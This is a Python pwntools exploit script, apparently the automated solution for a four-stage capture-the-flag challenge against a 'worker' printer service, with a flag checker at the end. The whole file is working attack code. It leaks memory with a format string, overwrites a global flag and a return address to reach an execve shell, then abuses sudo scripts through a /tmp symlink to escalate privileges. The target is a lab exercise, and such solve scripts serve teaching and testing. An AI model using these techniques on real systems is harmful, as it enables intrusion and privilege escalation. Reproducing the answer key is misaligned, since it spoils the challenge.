import os
import os.path
import re
import sys
import typing

import pwn


def skip_banner(sess: pwn.remote) -> None:
    sess.recvuntil(b"Menu")


def skip_options(sess: pwn.remote) -> None:
    sess.recvuntil(b":")


def worker_print(sess: pwn.remote, payload: typing.Union[str, bytes]) -> bytes:
    if isinstance(payload, str):
        payload = payload.encode()

    sess.sendline(b"0")
    sess.recvuntil(b":")

    sess.sendline(payload)

    sess.recvuntil(b":")

    output = sess.recvuntil(b"Output:")[1:-8]

    sess.recvuntil(b"Menu")

    return output


def worker_debug(sess: pwn.remote) -> bytes:
    sess.sendline(b"1")
    sess.recvuntil(b":")

    return sess.recvuntil(b"Menu")[:-6]


def worker_exit(sess: pwn.remote) -> None:
    sess.sendline(b"3")


def flag1(sess: pwn.remote) -> str:
    skip_banner(sess)
    skip_options(sess)

    return worker_print(sess, "%6$s").strip().decode()


FLAG1_RE = re.compile(r"DEBUG - (.*?)\n")
def flag2(sess: pwn.remote, elf: pwn.ELF) -> str:
    def exec_fmt(payload: bytes):
        skip_options(sess)

        return worker_print(sess, payload)

    skip_banner(sess)

    # Overwrite PREMIUM with a true value.
    auto_fmt = pwn.FmtStr(exec_fmt)
    auto_fmt.write(elf.symbols["WORKER_PREMIUM"], 1)
    auto_fmt.execute_writes()

    return FLAG1_RE.findall(worker_debug(sess).strip().decode())[0]


def flag3(sess: pwn.remote, elf: pwn.ELF) -> str:
    def exec_fmt(payload: bytes):
        skip_options(sess)

        return worker_print(sess, payload)

    skip_banner(sess)

    auto_fmt = pwn.FmtStr(exec_fmt)

    # Used this stack address, but any valid stack address works.
    argc_stack_address = auto_fmt.leak_stack(1069) # 1076 offset
    return_address = argc_stack_address - (1076 - 1037) * 8

    # Execve gadget
    shell_address = elf.symbols["worker_exec"] + 8

    auto_fmt.write(return_address, shell_address)
    auto_fmt.execute_writes()

    # Trigger execve
    skip_options(sess)
    worker_exit(sess)

    # Print flag
    sess.sendline(b"./help")

    return b"".join(sess.recvlines(timeout=1)).strip().decode()


def flag4(sess: pwn.remote, elf: pwn.ELF) -> None:
    flag3(sess, elf)

    # Cleanup
    sess.sendline(b"sudo /printer/unjam.sh")
    sess.sendline(b"rm -rf /tmp/pwn")

    # Overwrite permissions for debug
    sess.sendline(b"ln -s /printer/debug /tmp/pwn")
    sess.sendline(b"sudo /printer/queue.sh /tmp/pwn")

    sess.sendline(b"/printer/debug")

    return b"".join(sess.recvlines(timeout=1)).strip().decode()


def main(challenge: int, elf_path: str, mode: str = "remote", host: str = "localhost", port: int = 9001) -> typing.Optional[str]:
    elf = pwn.ELF(elf_path)
    pwn.context(arch=elf.arch)

    if mode == "debug":
        sess = pwn.gdb.debug([elf.path], "continue")
    elif mode == "process":
        sess = pwn.process([elf.path])
    elif mode == "remote":
        sess = pwn.remote(host, port)

    if challenge == 0:
        return flag1(sess)
    elif challenge == 1:
        return flag2(sess, elf)
    elif challenge == 2:
        return flag3(sess, elf)
    elif challenge == 3:
        return flag4(sess, elf)

    return None


def solve() -> typing.Optional[str]:
    return main(
        elf_path=os.environ.get("ELF_PATH") or os.path.join(os.path.abspath(os.path.dirname(__file__)), "..", "build", "worker"),
        challenge=int(os.environ.get("CHALLENGE_ID") or "0"),
        host=os.environ.get("CHALLENGE_HOST") or "localhost",
        port=os.environ.get("CHALLENGE_PORT") or 9001
    )


def cli() -> int:
    if (solution := solve()) is None:
        return 1

    if not (flag := os.environ.get("FLAG")):
        return 0

    if os.environ.get("FLAG_TYPE") == "regex":
        is_ok = re.match(flag, solution)
    else:
        is_ok = solution == flag

    if not is_ok:
        print(f"FAIL: {solution}", file=sys.stderr)

    return 0 if is_ok else 1


if __name__ == "__main__":
    exit(cli())
